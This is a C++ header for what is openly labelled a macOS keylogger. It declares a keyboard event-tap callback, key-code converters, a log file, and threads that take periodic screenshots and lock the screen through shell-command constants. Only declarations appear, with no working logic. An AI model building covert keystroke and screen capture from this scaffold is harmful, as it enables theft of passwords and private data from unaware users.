#ifndef __KEYLOGGER__HPP__
#define __KEYLOGGER__HPP__

// File Inclusions

#include <stdio.h> //Used for print statements and writing to files
#include <time.h> // obtaining the time of the events recorded
#include <stdlib.h> // used for system calls
#include <pthread.h> // potential multithreading solution
#include <unistd.h> // for sleep function to periodically call our other functions
#include <string> // Strings make handling the input easier
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h> // Libraries containing api calls necessary to hook keyboard input


using namespace std;
// Constants
#define NEWLINE 36
#define LEFTSHIFT 60
#define RIGHTSHIFT 56
#define CAPSLOCK 57
#define BACKSPACE 51

#define MILLISECONDS 1000

// Constants for system calls
#define LOCKSCREEN "/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend"
#define PYSCREENSHOT "python screenshot.py"

// Variables
char * logFileName;
FILE * logFile = NULL;
string logBuffer = "";
bool shiftPressed = false;
bool screenshotEnabled = false;
bool lockscreenEnabled = false;
int screenshotFrequency = 0;
int lockscreenFrequency = 0;
pthread_t screenshotThread;
pthread_t lockThread;

// Functions
CGEventRef logKeyPresses(CGEventTapProxy, CGEventType, CGEventRef, void*);
string convertKeyCode(int);
string convertShiftedKeyCode(int);
void * takeScreenshot(void *);
void * lockScreen(void *);

#endif /* __KEYLOGGER__HPP__ */